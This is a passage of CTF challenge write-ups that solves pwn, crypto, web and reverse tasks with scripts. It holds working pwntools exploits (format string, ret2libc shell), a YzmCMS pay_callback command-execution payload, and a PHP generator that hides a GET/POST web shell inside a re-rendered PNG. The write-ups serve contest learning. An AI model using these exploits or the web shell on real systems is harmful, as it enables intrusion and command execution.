#backdoor = 0x80494A4
#bss = 08052074
pay0 = b'{"name":'+b'\"'+fmtstr_payload(7, {0x8052074: 0x3E7})+b'\"'+b',"age":18}'
sa(b'How to send data?',pay0)
p.interactive()
```

## [Week2]json_stackoverflow

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
        print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#p = process('./pwn')
p = remote('210.44.150.15',12345)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
#gdb.attach(p, 'b *0x8049599')
#gdb.attach(p,'b *$rebase(0x19E8)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr = 0x8049432
pay0 = b'{"name":'+b'\"'+b'a'*(0x48)+b'bbbb'+p32(puts_plt)+p32(main_addr)+p32(puts_got)+b'\"'+b',"age":99}'
sa(b'How to send data?',pay0)
p.recvuntil('age:')
rl()
puts_addr = u32(p.recv(4))
print("puts_addr->",hex(puts_addr))

libc_base = puts_addr- libc.sym['puts']
system = 0x41360+libc_base
binsh = 0x18C363+libc_base
print("libc_base->",hex(libc_base))

pay1 = b'{"name":'+b'\"'+b'a'*(0x48+4)+p32(system)+p32(0x0804900e)+p32(binsh)+b'\"'+b',"age":18}'
pause()
sa(b'How to send data?',pay1)
p.interactive()
```

## [Week2]ezorw

```Python
from pwn import *
from struct import pack
from ctypes import *
import base64

r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name, x: log.info(name + ':' + hex(x))

context(log_level='debug', arch='amd64', os='linux')

p = remote('210.44.150.15', 43050)
elf = ELF('./pwn')

# exp
sa("Give you a gift", b'flag' * 6 + b'\xBB')
s(b'flag' * 6 + b'\x97')
p.interactive()
```

# Crypto

## [Week2]ezECC

```Python
from gmpy2 import *

A1 = (
5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791,
4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709)
C = (
2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276,
6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025)
p = 9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679
k = 73771953838487511457389800773038323262861649769228176071578897500004883270121

x1, y1 = A1
x2, y2 = C
a = ((y1 ** 2 - x1 ** 3) - (y2 ** 2 - x2 ** 3)) * invert(x1 - x2, p) % p
b = (y1 ** 2 - x1 ** 3 - a * x1) % p
print("a =", a)
print("b =", b)

E = EllipticCurve(Zmod(p),[a,b])
A1 = E(A1)
A2 = A1*k
print("A2 =",A2)
C = E(C)
M = C-A2
print("M =",M)


from sympy import prevprime
from Crypto.Util.number import *

m = 133829459905635890502862981237631940794467118483270617546174979 
num = prevprime(m)
for i in range(num,m):
    flag = long_to_bytes(i)
    if flag.startswith(b'SHCTF{') and flag.endswith(b'}'):
        print(flag)
```

## [Week2]E&R

```Python
from Crypto.Util.number import *

a = 5599968251197363876087002284371721787318931284225671549507477934076746561842
n = 7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909
e = 65537

CC = 6803450117490196163076010186755045681029929816618361161925865477601994608941714788803007124967390157378525581080320415602012078322064392991884070073083436
bina = bin(a)[2:]
bina = '0' * (256 - len(bina)) + bina


def dfs(P, Q, Round):
    if Round == 128:
        if P * Q == n:
            global p, q
            p, q = P, Q
            return 1

    for i in range(2):
        for j in range(2):
            CurP = P + i * (2 ** (255 - Round)) + (int(bina[Round]) ^ j) * (2 ** Round)
            CurQ = Q + j * (2 ** (255 - Round)) + (int(bina[255 - Round]) ^ i) * (2 ** Round)
            if CurP * CurQ > n:
                continue
            if (CurP + 2 ** (255 - Round)) * ((CurQ + 2 ** (255 - Round))) < n:
                continue
            if (CurP * CurQ) % (2 ** (Round + 1)) != n % (2 ** (Round + 1)):
                continue
            dfs(CurP, CurQ, Round + 1)
    return 0


p, q = None, None
dfs(0, 0, 0)
assert p != None and q != None
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
print(long_to_bytes(pow(CC, d, n)))



#ECC
from sage.all import *
from Crypto.Util.number import *
from gmpy2 import *

p = 109947782034870726628911928816041880655659770652764045401662566933641952899777
q = 64760524083545528318139240449356269097871629401328435356643510319660757701117
a = 114514
b = 1919810
c = 4143131125485719352848137000299706175276016714942734255688381872061184989156686585992844083387698688432978380177564346382756951426943827434190895490233627
e = 65537
E = EllipticCurve(Zmod(p), [a, b])
l = E.order()
ct = E.lift_x(Integer(c))
e_inverse = invert(e, l)
pt = ct * e_inverse
print(pt)
# mt = pt*e
# print(mt)
c1 = pt.xy()[0]
print(c1)
E = EllipticCurve(Zmod(q), [a, b])
print(E.order())
l = E.order()
ct = E.lift_x(Integer(c))
print(ct)
e_inverse = invert(e, l)
pt = ct * e_inverse
print(pt)
# mt = pt*e
# print(mt)
c2 = pt.xy()[0]
print(c2)
c = [c1, c2]
nk = [p, q]
print(long_to_bytes(int(c2)))
```

## [Week2]魔鬼的步伐

```Python
import gmpy2
from Crypto.Util.number import long_to_bytes

def pollard_rho_factorization(n):
    a, i = 2, 2
    while True:
        a = gmpy2.powmod(a, i, n)
        factor = gmpy2.gcd(a - 1, n)
        if 1 < factor < n:
            return factor
        i += 1

def decrypt_rsa(ciphertext, modulus, exponent):
    p = pollard_rho_factorization(modulus)
    q = modulus // p
    phi_n = (p - 1) * (q - 1)
    d = gmpy2.invert(exponent, phi_n)
    return long_to_bytes(gmpy2.powmod(ciphertext, d, modulus))

n = 16406692392157831832942515132030668644015866983936752773685760202434194851276620981525376502029624390877942049839572079873703766067059544970863779834507076817039580729579356976281456102419380991336884677251840045823089067586882387178924739264467670441322887594168394325986406252562323321662124137282808728438489
e = 65537
c = 2831375061766560983395394354014417383952522459405486184220659563360874292733616506779721232913794639808886519320394922739360791496269924305027343444211140030899969752757090371901499981926571155228433601612311973806520836447052451442018079455172387262994905779147573736904196332930208349608393716998045807217151

plaintext = decrypt_rsa(c, n, e)
print(plaintext)
```

# Web

## [Week3] 小小cms

YzmCMS pay_callback 远程命令执行漏洞

Payload:

```Bash
210.44.150.15:45271/pay/index/pay_callback 


POST:out_trade_no[0]=eq&out_trade_no[1]=cat /flag&out_trade_no[2]=system
```

## [Week3] 拜师之旅·番外

文件上传png二次渲染

php脚本:

```PHP
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'1.png');  //要修改的图片的路径
 
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */
//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在
//会在目录下自动创建一个1.png图片
//图片脚本内容：$_GET[0]($_POST[1]);
//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php
 
?>
```

生成一个png二次渲染的图片

然后直接传上去

访问上传位置 执行命令即可

readfile函数可以使用

示例数据包如下

```PHP
POST /view.php?image=/upload/1194265204.png&0=readfile HTTP/1.1
Host: 210.44.150.15:26177
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

1=/flag
```

![image-20241031085430342](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085430342.png)

# Rev

## [Week3]VTB

```Python
#include<iostream>
#include<algorithm>
#include<cstdio>
#include<cmath>
#include<map>
#include<vector>
#include<queue>
#include<stack>
#include<set>
#include<string>
#include<cstring>
#include<list>
#include<stdlib.h>
using namespace std;
typedef int status;
typedef int selemtype;


void __cdecl sbbb(unsigned int a1, uint32_t *a2, uint32_t *a3)
{
  int result; // eax
  unsigned int v4; // [esp+DCh] [ebp-2Ch]
  unsigned int v5; // [esp+E8h] [ebp-20h]
  unsigned int v6; // [esp+F4h] [ebp-14h]
  unsigned int i; // [esp+100h] [ebp-8h]

  v6 = *a2;
  v5 = a2[1];
  v4 = 0x4C307633 * a1;
  for ( i = 0; i < a1; ++i )
  {
          v5 -= (a3[(v4 >> 11) & 3] + v4) ^ (v6 + ((v6 >> 5) ^ (16 * v6)));
          v4 -= 0x4C307633;
    v6 -= (a3[v4 & 3] + v4) ^ (v5 + ((v5 >> 5) ^ (16 * v5)));


  }
  *a2 = v6;
  a2[1] = v5;

}

int main(void){
    uint32_t v[]={
            0x41ABC48D,
                    0x0E55BECAC,
                    0x6E9E5CDC,
                    0x262F0DEF,
                    0x3C48A65D,
                    0x0BC89B102,
                    0x65732236,
                    0x0FFF3E468,
                    0x60D3031C,
                    0x56CC67CC
    };
    uint32_t k[4]={0x114514, 0x1551, 0x5115, 0x144511};
    unsigned int r=40;
    uint32_t tmp[2];
    for(int i=0; i<10; i+=2){
        tmp[0] = v[i];
        tmp[1] = v[i+1];
        sbbb(r, tmp, k);
        v[i] = tmp[0];
        v[i+1] = tmp[1];
    }

    // 输出解密后的 flag
//    for(int i=0; i<8; i++){
//        printf("%c%c%c%c", 
//               (v[i] >> 24) & 0xFF, 
//               (v[i] >> 16) & 0xFF, 
//               (v[i] >> 8) & 0xFF, 
//               v[i] & 0xFF);
//    }
    printf("%s",v);

    return 0;
}
```

## [Week3]MMap

Java层的key需要爆破前五位，后面直接frida主动调用getkey()获取

```JavaScript
function hook1() {
    Java.perform(function () {
        let MainActivity = Java.use("com.check.mmap.MainActivity");
        MainActivity["getKey"].implementation = function () {
            console.log('getKey is called');
            let ret = this.getKey();
            console.log('getKey ret value is ' + ret);
            return ret;
        };
    })
}

function main(){
    hook1();
}
setTimeout(main,300)
```

![image-20241031085446340](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085446340.png)

```Python
import hashlib
import itertools

target_hash = "f0338087107bd7c0af82b061f19742cd1199f54ed2f7b606952dd95fab9ce963"

# 要破解的字符
prefix = ""
data_mask = "噜噜噜噜噜3Ji0Kr1HdR77QlZz"
# 使用ASCII字符集合，这里只包含可见字符
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# 查找data中的*的位置
mask_positions = [i for i, char in enumerate(data_mask) if char == '噜']

# 遍历所有可能的组合
for combination in itertools.product(charset, repeat=len(mask_positions)):
    attempt = list(data_mask)
    for position, char in zip(mask_positions, combination):
        attempt[position] = char
    attempt = prefix + ''.join(attempt)

    print(attempt)

    # 计算SHA-256散列
    hash_attempt = hashlib.sha256(attempt.encode()).hexdigest()

    # 检查是否匹配
    if hash_attempt == target_hash:
        print("找到匹配的XXXX值:", attempt)
        exit()
```

![image-20241031085544504](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085544504.png)

![image-20241031085609088](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031085609088.png)

ida动调获取加密后的值，直接还原得到flag

```Python
flag = []
data = [
    0x99, 0xA6, 0x12, 0x82, 0xA1, 0x19, 0x02, 0xCD, 0x19, 0x6D,
    0x86, 0xFF, 0x86, 0xCD, 0x49, 0xBB, 0x88, 0x33, 0xAC, 0x8C,
    0x34, 0xC5, 0x12, 0x02, 0x81, 0x74, 0x2B, 0x76, 0x82, 0xE9,
    0xF8, 0x82, 0x33, 0x82, 0xF0, 0x82
]
enc = [
    0xcd,0xa2,0x46,0xd5,0xa1,0x4e,0x0a,0xcc,0x05,0x3a,0x84,0xac,
    0x8e,0xd1,0x4a,0xb2,0xdd,0x37,0xb0,0xd8,0x67,0xc3,0x40,0x1e,
    0x84,0x73,0x2b,0x7e,0x85,0xb9,0xff,0x80,0x3b,0xd2,0xf2,0xd0
]

for i in range(len(data)):
    flag.append(chr(data[i] ^ enc[i] ^ 0x31))

print(''.join(flag))
```

## [Week3]StrangeEncrypt

魔改AES-->

rcon，sbox数据修改，invShiftRows中改为ROR32,mixColumns与invMixColumns中的矩阵值变化

```C++
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef struct{
    uint32_t eK[44], dK[44];    // encKey, decKey
    int Nr; // 10 rounds
}AesKey;

#define BLOCKSIZE 16  //AES-128分组长度为16字节

// uint8_t y[4] -> uint32_t x
#define LOAD32H(x, y) \
  do { (x) = ((uint32_t)((y)[0] & 0xff)<<24) | ((uint32_t)((y)[1] & 0xff)<<16) | \
             ((uint32_t)((y)[2] & 0xff)<<8)  | ((uint32_t)((y)[3] & 0xff));} while(0)

// uint32_t x -> uint8_t y[4]
#define STORE32H(x, y) \
  do { (y)[0] = (uint8_t)(((x)>>24) & 0xff); (y)[1] = (uint8_t)(((x)>>16) & 0xff);   \
       (y)[2] = (uint8_t)(((x)>>8) & 0xff); (y)[3] = (uint8_t)((x) & 0xff); } while(0)

// 从uint32_t x中提取从低位开始的第n个字节
#define BYTE(x, n) (((x) >> (8 * (n))) & 0xff)

/* used for keyExpansion */
// 字节替换然后循环左移1位
#define MIX(x) (((S[BYTE(x, 2)] << 24) & 0xff000000) ^ ((S[BYTE(x, 1)] << 16) & 0xff0000) ^ \
                ((S[BYTE(x, 0)] << 8) & 0xff00) ^ (S[BYTE(x, 3)] & 0xff))

// uint32_t x循环左移n位
#define ROF32(x, n)  (((x) << (n)) | ((x) >> (32-(n))))
// uint32_t x循环右移n位
#define ROR32(x, n)  (((x) >> (n)) | ((x) << (32-(n))))


/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */
// AES-128轮常量
static const uint32_t rcon[10] = {
//        0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL,
//        0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL
        0x36000000UL,0x1B000000UL,0x80000000UL,0x40000000UL,0x20000000UL,
        0x10000000UL,0x08000000UL,0x04000000UL,0x02000000UL,0x01000000UL
};
// S盒
unsigned char S[256] = {
        0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 
                  0xA8, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0xBA, 0x78, 0x25, 0x2E, 
                  0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 
                  0x8B, 0x8A, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 
                  0x75, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x09, 0x83, 
                  0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 
                  0x29, 0xE3, 0x2F, 0x84, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 
                  0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 
                  0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 
                  0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 
                  0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 
                  0xBB, 0x16, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 
                  0xFE, 0xD7, 0xAB, 0x76, 0xCD, 0x0C, 0x13, 0xEC, 0x60, 0x81, 
                  0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 
                  0xDE, 0x5E, 0x0B, 0xDB, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 
                  0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 
                  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 
                  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 
                  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 
                  0xAE, 0x08, 0x63, 0x7C, 0x77, 0x7B, 0x5F, 0x97, 0x44, 0x17, 
                  0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0xCA, 0x82, 
                  0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 
                  0x9C, 0xA4, 0x72, 0xC0, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 
                  0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 
                  0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 
                  0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2
};

//逆S盒
unsigned char inv_S[256] = {
        226, 117, 5, 149, 41, 47, 165, 33, 191, 48, 163, 142, 125, 99, 151, 107,
                252, 83, 34, 126, 139, 79, 111, 199, 45, 206, 51, 52, 20, 158, 89, 27,
                228, 251, 132, 43, 166, 18, 67, 38, 94, 60, 133, 119, 50, 106, 19, 62,
                116, 78, 161, 1, 72, 153, 68, 178, 246, 235, 162, 57, 8, 203, 145, 69,
                242, 104, 102, 15, 198, 3, 136, 214, 148, 164, 236, 28, 237, 0, 182, 130,
                7, 240, 56, 224, 109, 93, 185, 154, 238, 213, 54, 231, 167, 205, 141, 196,
                128, 152, 171, 192, 204, 188, 147, 118, 103, 84, 232, 113, 184, 179, 53, 114,
                144, 76, 222, 207, 26, 40, 123, 194, 17, 175, 189, 195, 193, 211, 202, 6,
                35, 129, 209, 49, 63, 2, 156, 90, 135, 98, 31, 30, 96, 180, 86, 243,
                134, 172, 244, 66, 87, 173, 46, 197, 82, 105, 32, 88, 220, 245, 159, 9,
                55, 97, 218, 241, 221, 73, 21, 201, 10, 183, 13, 122, 170, 216, 190, 219,
                108, 230, 39, 59, 22, 146, 249, 64, 138, 155, 16, 110, 248, 29, 234, 100,
                223, 157, 168, 44, 200, 115, 23, 42, 177, 210, 208, 233, 71, 124, 92, 239,
                11, 225, 255, 169, 217, 181, 58, 121, 77, 85, 250, 143, 131, 25, 140, 95,
                160, 80, 36, 61, 174, 74, 101, 176, 24, 91, 187, 37, 127, 227, 137, 12,
                215, 75, 112, 254, 186, 247, 150, 70, 81, 4, 212, 14, 229, 65, 120, 253,
};

/* copy in[16] to state[4][4] */
int loadStateArray(uint8_t (*state)[4], const uint8_t *in) {
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[j][i] = *in++;
        }
    }
    return 0;
}

/* copy state[4][4] to out[16] */
int storeStateArray(uint8_t (*state)[4], uint8_t *out) {
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            *out++ = state[j][i];
        }
    }
    return 0;
}
//秘钥扩展
int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) {

    if (NULL == key || NULL == aesKey){
        printf("keyExpansion param is NULL\n");
        return -1;
    }

    if (keyLen != 16){
        printf("keyExpansion keyLen = %d, Not support.\n", keyLen);
        return -1;
    }

    uint32_t *w = aesKey->eK;  //加密秘钥
    uint32_t *v = aesKey->dK;  //解密秘钥

    /* keyLen is 16 Bytes, generate uint32_t W[44]. */

    /* W[0-3] */
    for (int i = 0; i < 4; ++i) {
        LOAD32H(w[i], key + 4*i);
    }

    /* W[4-43] */
    for (int i = 0; i < 10; ++i) {
        w[4] = w[0] ^ MIX(w[3]) ^ rcon[i];
        w[5] = w[1] ^ w[4];
        w[6] = w[2] ^ w[5];
        w[7] = w[3] ^ w[6];
        w += 4;
    }

    w = aesKey->eK+44 - 4;
    //解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥
    //即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]
    for (int j = 0; j < 11; ++j) {

        for (int i = 0; i < 4; ++i) {
            v[i] = w[i];
        }
        w -= 4;
        v += 4;
    }

    return 0;
}

// 轮秘钥加
int addRoundKey(uint8_t (*state)[4], const uint32_t *key) {
    uint8_t k[4][4];

    /* i: row, j: col */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            k[i][j] = (uint8_t) BYTE(key[j], 3 - i);  /* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */
            state[i][j] ^= k[i][j];
        }
    }

    return 0;
}

//字节替换
int subBytes(uint8_t (*state)[4]) {
    /* i: row, j: col */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[i][j] = S[state[i][j]]; //直接使用原始字节作为S盒数据下标
        }
    }

    return 0;
}

//逆字节替换
int invSubBytes(uint8_t (*state)[4]) {
    /* i: row, j: col */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[i][j] = inv_S[state[i][j]];
        }
    }
    return 0;
}

//行移位
int shiftRows(uint8_t (*state)[4]) {
    uint32_t block[4] = {0};

    /* i: row */
    for (int i = 0; i < 4; ++i) {
    //便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t
        LOAD32H(block[i], state[i]);
        block[i] = ROR32(block[i], 8*i);
        STORE32H(block[i], state[i]);
    }

    return 0;
}

//逆行移位
int invShiftRows(uint8_t (*state)[4]) {
    uint32_t block[4] = {0};

    /* i: row */
    for (int i = 0; i < 4; ++i) {
        LOAD32H(block[i], state[i]);
        block[i] = ROR32(block[i], 8*i);
        STORE32H(block[i], state[i]);
    }

    return 0;
}

/* Galois Field (256) Multiplication of two Bytes */
// 两字节的伽罗华域乘法运算
uint8_t GMul(uint8_t u, uint8_t v) {
    uint8_t p = 0;

    for (int i = 0; i < 8; ++i) {
        if (u & 0x01) {    //
            p ^= v;
        }

        int flag = (v & 0x80);
        v <<= 1;
        if (flag) {
            v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */
        }

        u >>= 1;
    }

    return p;
}

// 列混合
int mixColumns(uint8_t (*state)[4]) {
    uint8_t tmp[4][4];
    uint8_t M[4][4] = {
                {3,1,1,2},
                {2,3,1,1},
                {1,1,2,3},
                {1,2,3,1}};

    /* copy state[4][4] to tmp[4][4] */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j){
            tmp[i][j] = state[i][j];
        }
    }

    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {  //伽罗华域加法和乘法
            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])
                        ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);
        }
    }

    return 0;
}

// 逆列混合
int invMixColumns(uint8_t (*state)[4]) {
    uint8_t tmp[4][4];
uint8_t M[4][4] = {
    {9, 14, 13 ,11},
    {13, 9, 11, 14},
    {11, 13, 14, 9},
    {14, 11, 9, 13}
};
  //使用列混合矩阵的逆矩阵

    /* copy state[4][4] to tmp[4][4] */
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j){
            tmp[i][j] = state[i][j];
        }
    }

    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j])
                          ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]);
        }
    }

    return 0;
}

// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，
// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存
int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) {

    AesKey aesKey;
    uint8_t *pos = ct;
    const uint32_t *rk = aesKey.eK;  //解密秘钥指针
    uint8_t out[BLOCKSIZE] = {0};
    uint8_t actualKey[16] = {0};
    uint8_t state[4][4] = {0};

    if (NULL == key || NULL == pt || NULL == ct){
        printf("param err.\n");
        return -1;
    }

    if (keyLen > 16){
        printf("keyLen must be 16.\n");
        return -1;
    }

    if (len % BLOCKSIZE){
        printf("inLen is invalid.\n");
        return -1;
    }

    memcpy(actualKey, key, keyLen);
    keyExpansion(actualKey, 16, &aesKey);  // 秘钥扩展

    // 使用ECB模式循环加密多个分组长度的数据
    for (int i = 0; i < len; i += BLOCKSIZE) {
        // 把16字节的明文转换为4x4状态矩阵来进行处理
        loadStateArray(state, pt);
        // 轮秘钥加
        addRoundKey(state, rk);

        for (int j = 1; j < 10; ++j) {
            rk += 4;
            subBytes(state);   // 字节替换
            shiftRows(state);  // 行移位
            mixColumns(state); // 列混合
            addRoundKey(state, rk); // 轮秘钥加
        }

        subBytes(state);    // 字节替换
        shiftRows(state);  // 行移位
        // 此处不进行列混合
        addRoundKey(state, rk+4); // 轮秘钥加
        
        // 把4x4状态矩阵转换为uint8_t一维数组输出保存
        storeStateArray(state, pos);

        pos += BLOCKSIZE;  // 加密数据内存指针移动到下一个分组
        pt += BLOCKSIZE;   // 明文数据指针移动到下一个分组
        rk = aesKey.eK;    // 恢复rk指针到秘钥初始位置
    }
    return 0;
}

// AES128解密， 参数要求同加密
int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) {
    AesKey aesKey;
    uint8_t *pos = pt;
    const uint32_t *rk = aesKey.dK;  //解密秘钥指针
    uint8_t out[BLOCKSIZE] = {0};
    uint8_t actualKey[16] = {0};
    uint8_t state[4][4] = {0};

    if (NULL == key || NULL == ct || NULL == pt){
        printf("param err.\n");
        return -1;
    }

    if (keyLen > 16){
        printf("keyLen must be 16.\n");
        return -1;
    }

    if (len % BLOCKSIZE){
        printf("inLen is invalid.\n");
        return -1;
    }

    memcpy(actualKey, key, keyLen);
    keyExpansion(actualKey, 16, &aesKey);  //秘钥扩展，同加密

    for (int i = 0; i < len; i += BLOCKSIZE) {
        // 把16字节的密文转换为4x4状态矩阵来进行处理
        loadStateArray(state, ct);
        // 轮秘钥加，同加密
        addRoundKey(state, rk);

        for (int j = 1; j < 10; ++j) {
            rk += 4;
            invShiftRows(state);    // 逆行移位
            invSubBytes(state);     // 逆字节替换，这两步顺序可以颠倒
            addRoundKey(state, rk); // 轮秘钥加，同加密
            invMixColumns(state);   // 逆列混合
        }

        invSubBytes(state);   // 逆字节替换
        invShiftRows(state);  // 逆行移位
        // 此处没有逆列混合
        addRoundKey(state, rk+4);  // 轮秘钥加，同加密

        storeStateArray(state, pos);  // 保存明文数据
        pos += BLOCKSIZE;  // 输出数据内存指针移位分组长度
        ct += BLOCKSIZE;   // 输入数据内存指针移位分组长度
        rk = aesKey.dK;    // 恢复rk指针到秘钥初始位置
    }
    return 0;
}


// 方便输出16进制数据
void printHex(const uint8_t *ptr, int len, const char *tag) {

    for (int i = 0; i < len; ++i) {
        printf("%c", *ptr++);
    }
    printf("\n");
}

int main() {

